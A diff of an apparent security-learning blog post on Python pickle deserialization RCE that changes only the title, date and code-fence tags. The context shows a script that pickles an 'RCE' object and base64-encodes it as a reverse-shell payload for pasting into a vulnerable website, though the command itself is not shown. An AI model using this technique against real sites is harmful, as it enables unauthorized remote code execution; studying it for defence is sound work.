@@ -1,6 +1,6 @@
 ---
-title: PYTHON PICKLE RCE
-date: 2023-05-05 01:35:40 +/-TTTT
+title: PICKLE RCE
+date: 2023-05-05 02:35:40 +/-TTTT
 categories: [learning, web]
 tags: [learning]     # TAG names should always be lowercase
 ---
@@ -10,7 +10,7 @@ The python “pickle” module, that serializes and deserializes a Python object
 # Exploitation
 Below is the Python script (”mypickle.py”) to generate the payload to reverse shell.
 
-```py
+```python
 import pickle
 import base64
 import os
@@ -23,10 +23,11 @@ class RCE:
 if __name__ == '__main__':
     pickled = pickle.dumps(RCE())
     print(base64.urlsafe_b64encode(pickled))
-```
+ ```
+
 Now run this script to generate the Base64 payload.
 
-```py
+```python
 python3 mypickle.py
 ```
 Copy the ourput base64 string and paste it to where the payload affects in website.
